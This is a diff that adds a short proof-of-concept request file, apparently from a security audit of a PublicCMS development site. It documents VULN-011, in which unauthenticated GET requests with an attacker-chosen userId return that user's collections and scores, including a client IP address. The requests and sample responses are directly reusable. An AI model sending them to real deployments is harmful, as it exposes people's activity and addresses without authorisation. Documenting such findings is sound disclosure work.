@@ -1,0 +1,11 @@
+### VULN-011 — unauth deanonymization by userId (precondition: victim has activity)
+
+### collections of an attacker-chosen user
+GET /api/directive/cms/userCollectionList?userId=9&pageSize=50 HTTP/1.1
+Host: site2.dev.publiccms.com
+### -> 200 {"page":{"list":[{"id":{"userId":"9","contentId":"1"},"createDate":…}]}}
+
+### scores of an attacker-chosen user (also leaks client IP)
+GET /api/directive/cms/userScoreList?userId=9&pageSize=50 HTTP/1.1
+Host: site2.dev.publiccms.com
+### -> 200 {"page":{"list":[{"id":{"userId":"9","itemType":"content","itemId":"1"},"score":5,"ip":"172.19.0.1",…}]}}
